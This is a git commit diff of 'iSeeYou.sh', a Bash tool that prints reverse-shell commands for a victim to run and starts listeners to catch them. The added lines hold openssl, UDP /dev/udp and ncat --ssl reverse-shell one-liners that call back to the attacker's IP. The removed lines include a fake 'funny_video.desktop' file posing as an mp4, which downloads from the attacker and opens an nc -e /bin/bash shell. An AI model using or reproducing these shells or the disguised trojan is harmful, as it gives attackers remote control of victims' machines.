bef716b72f799631bba78d8000b3677ca6d3cda2
Fadester <53977560+Fadester@users.noreply.github.com>
2022-02-21 14:09:31 +0100

    Update iSeeYou.sh

--- iSeeYou.sh
+++ iSeeYou.sh
@@ -2,7 +2,6 @@
 #coded by Fadester
 #v1.0
 
-clear
 
 #colors
 
@@ -20,7 +19,19 @@ white='\e[1;37m'
 
 dir=$(pwd)
 
+trap ctrl_c INT  
+ctrl_c() {
+  echo
+  echo -e "$BlueF[$red!$BlueF]$red Exit... $farblos"
+  exit 1
+
+
+}
+
+
+dependencies() {
 #checking Dependencies
+echo ""
 echo -e "$BlueF[$yellow*$BlueF]$yellow Checking Dependencies... $farblos"
 sleep 0.5
 echo
@@ -39,31 +50,56 @@ sleep 0.2
 printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m Netcat$farblos"
 command -v nc > /dev/null 2>&1
 if [[ $? == 0 ]]; then
-  sleep 0.3
+  sleep 0.2
   echo -e "$green OK! $farblos"
-  sleep 0.3
+  sleep 0.2
 else
   echo -e "$red FAIL! $farblos"
-  sleep 0.3
+  sleep 0.2
   echo -e "$red You need Netcat to use this script! $farblos"
   exit 1
 fi
-sleep 0.2
+sleep 0.1
 printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m Ncat$farblos"
 command -v ncat > /dev/null 2>&1
 if [[ $? == 0 ]]; then
-  sleep 0.3
+  sleep 0.2
   echo -e "$green OK! $farblos"
-  sleep 0.3
+  sleep 0.2
 else
   echo -e "$red FAIL! $farblos"
-  sleep 0.3
+  sleep 0.2
   echo -e "$red You need Ncat to use this script! $farblos"
   exit 1
 fi
-
+sleep 0.1
+printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m openssl$farblos"
+command -v openssl > /dev/null 2>&1
+if [[ $? == 0 ]]; then
+  sleep 0.2
+  echo -e "$green OK! $farblos"
+  sleep 0.2
+else
+  echo -e "$red FAIL! $farblos"
+  sleep 0.2
+  echo -e "$red You need openssl to use this script! $farblos"
+  exit 1
+fi
+sleep 0.1
+printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m php$farblos"
+command -v php > /dev/null 2>&1
+if [[ $? == 0 ]]; then
+  sleep 0.2
+  echo -e "$green OK! $farblos"
+  sleep 0.2
+else
+  echo -e "$red FAIL! $farblos"
+  sleep 0.2
+  echo -e "$red You need php to use this script! $farblos"
+  exit 1
+fi
+}
 banner() {
-clear
 echo
 echo -e "$red ▪      .▄▄ · ▄▄▄ .▄▄▄ .     ▄· ▄▌      ▄• ▄▌  $farblos "
 echo -e "$red ██     ▐█ ▀. ▀▄.▀·▀▄.▀·    ▐█▪██▌▪     █▪██▌  $farblos "
@@ -89,12 +125,17 @@ echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red coded by Fad
 echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red        v1.0        $BlueF]$green--$yellow++    $BlueF[$red::$BlueF]$farblos"
 }
 eingabe() {
+#save IP in variable
+ip4=$(hostname -I | cut -d " " -f1)
 echo
 echo -e "$BlueF[$green""1$BlueF]$yellow Linux $farblos"
+echo -e "$BlueF[$green""2$BlueF]$yellow Windows $farblos"
 echo
 read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe
 if [[ $eingabe == 1 ]]; then
   shell_linux
+elif [[ $eingabe == 2 ]]; then
+  shell_windows
 else
   echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
 fi
@@ -105,26 +146,18 @@ shell_linux() {
 echo
 echo -e "$BlueF[$green""1$BlueF]$yellow Netcat $farblos"
 echo -e "$BlueF[$green""2$BlueF]$yellow Ncat $farblos"
+echo -e "$BlueF[$green""3$BlueF]$yellow OpenSSL $farblos"
+echo -e "$BlueF[$green""4$BlueF]$yellow Bash UDP $farblos"
 echo
 read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe1
 if [[ $eingabe1 == "1" ]]; then
-  echo
-  echo -e "$BlueF[$red!$BlueF]$green LOCAL $farblos"
-  echo -e "$BlueF[$green""1$BlueF]$yellow Video File $farblos"
-  echo -e "$BlueF[$green""2$BlueF]$yellow Execute code manually [Decrypted] $farblos"
-  echo -e "$BlueF[$green""3$BlueF]$yellow Execute code manually $farblos"
-  echo
-  read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe2
-  if [[ $eingabe2 == 1 ]]; then
-    shell_linux_vid
-  elif [[ $eingabe2 == 2 ]]; then
-    shell_manually_dec
-  elif [[ $eingabe2 == 3 ]]; then
-    shell_manually
-
-  fi
+  shell_manually
 elif [[ $eingabe1 == 2 ]]; then
   shell_ncat
+elif [[ $eingabe1 == 3 ]]; then
+  openssl_shell
+elif [[ $eingabe1 == 4 ]]; then
+  bashUDP_shell
 else
   echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
 fi
@@ -144,65 +177,44 @@ while [[ true ]]; do
 done
 
 }
-shell_manually_dec() {
-echo
-echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
-read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address:\e[1;37m ' target_ip
-read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Your IP address:\e[1;37m ' my_ip
 
-echo -e "$BlueF[$red!$BlueF]$yellow Execute code: nc -e /bin/sh $my_ip 8080 $farblos"
-sleep 0.5
-echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
-xterm -e python3 -m http.server 80 &
-sleep 0.5
-while [[ true ]]; do
-  nc -lvp 8080
-done
 
-}
-
-shell_linux_vid() {
-echo
-echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
-default_ip=$(ip a | grep 192.168. | cut -d "/" -f1 | cut -d " " -f6)
-printf "\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address (default: $default_ip):\e[1;37m "
-read ip_address
-if [[ $ip_address == "" ]]; then
-  ip_address=$default_ip
-  echo -e "$BlueF[$green+$BlueF]$green Your IP = $ip_address $farblos"
-fi
-
-read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Video file [mp4]:\e[1;37m ' vid
-cp $vid $dir > /dev/null 2>&1
-
-printf "[Desktop Entry]" >> funny_video.desktop
-printf "Encoding=UTF-8" >> funny_video.desktop
-printf "Name=fake_video.mp4" >> funny_video.desktop
-printf "Exec=/usr/bin/wget 'http://$my_ip/$vid' -O /tmp/$vid; /usr/bin/xdg-open /tmp/$vid; /usr/bin/mkfifo /tmp/f; nc -e /bin/bash $my_ip < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &" >> funny_video.desktop
-printf "Terminal=false" >> funny_video.desktop
-printf "Type=Application" >> funny_video.desktop
-printf "Icon=video-x-generic" >> funny_video.desktop
-sleep 0.5
-echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
-xterm -e python3 -m http.server 80 &
-while [[ true ]]; do
-  nc -v $target_ip 12345
-  sleep 1.5
-done
-
-}
 shell_ncat() {
 echo
 echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
-read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address:\e[1;37m ' target_ip
-read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Your IP address:\e[1;37m ' my_ip
-echo -e "$BlueF[$red!$BlueF]$yellow Execute code: ncat --ssl $my_ip 8080 -c bash $farblos"
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code: ncat 0.0.0.0 4242 --ssl -e /bin/bash -v $farblos"
 sleep 0.5
-echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
-
-ncat -v --ssl -l 8080
+echo -e "$BlueF[$green*$BlueF]$green Starting listener on port 4242... $farblos"
+ncat -l 4242 --ssl -v
 }
 
+openssl_shell() {
 
+echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
+echo -e "$BlueF[$green+$BlueF]$green Starting listener on port 4242.... $farblos"
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip4:4242 > /tmp/s; rm /tmp/s" $farblos
+ncat --ssl -v -l -p 4242
+
+
+}
+
+bashUDP_shell() {
+
+
+echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
+echo -e "$BlueF[$green+$BlueF]$green Starting listener on port 4242.... $farblos"
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code: sh -i >& /dev/udp/$ip4/4242 0>&1" $farblos
+nc -u -lvp 4242 -s $ip4 
+}
+
+shell_eingabe() {
+  while [[ true ]]; do
+    echo -e "$BlueF[$green::$BlueF]$green Command: $farblos"
+  done
+}
+
+banner
+dependencies
+clear
 banner
 eingabe
